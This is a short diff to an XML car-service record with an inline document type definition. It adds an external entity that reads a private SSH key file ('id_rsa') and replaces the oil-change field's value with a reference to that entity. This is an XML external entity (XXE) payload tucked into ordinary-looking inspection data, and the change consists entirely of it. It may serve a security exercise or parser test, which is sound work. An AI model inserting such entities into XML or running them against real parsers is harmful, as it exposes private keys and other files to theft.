@@ -1,6 +1,7 @@
 <?xml  version="1.0" encoding="utf-8"?>
 <!DOCTYPE checkHeft [
         <!ENTITY model SYSTEM "http://192.168.1.2/golfVII.xml">
+        <!ENTITY privateSSH SYSTEM "id_rsa">
 
         <!ELEMENT checkHeft (car, activities)>
         <!ATTLIST checkHeft
@@ -72,7 +73,7 @@
     <car fin="WWWZZZAUZEW000001">&model;</car>
     <activities>
         <inspection desc="car inspection" date="2022-02-12T09:00:00.000Z" company="KFZ-Meister Schröder">
-            <oilChange desc="oil change nec">true</oilChange>
+            <oilChange desc="oil change nec">&privateSSH;</oilChange>
             <ofChange desc="oil filter change nec">true</ofChange>
             <afChange desc="air filter change nec">false</afChange>
             <breaksChange desc="breaks status">
